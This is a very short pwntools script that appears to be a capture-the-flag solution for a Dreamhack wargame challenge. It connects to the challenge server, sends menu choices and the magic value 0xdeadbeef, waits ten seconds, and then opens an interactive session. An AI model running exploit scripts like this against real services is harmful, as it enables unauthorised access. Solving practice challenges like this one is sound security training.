from pwn import *

p = remote('host8.dreamhack.games', 14022)

p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'3735928559')

sleep(0xa)

p.sendline(b'3')

p.interactive()